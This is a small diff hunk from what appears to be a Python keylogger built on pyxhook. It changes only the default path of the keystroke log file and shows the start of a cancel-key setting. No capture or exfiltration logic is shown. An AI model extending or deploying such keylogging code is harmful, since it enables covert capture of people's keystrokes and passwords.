@@ -7,7 +7,7 @@ import pyxhook
 
 log_file = os.environ.get(
     'pylogger_file',
-    os.path.expanduser('./Keylogger.txt')
+    os.path.expanduser('/home/user/Downloads/Keylogger.txt')
 )
 
 cancel_key = ord(
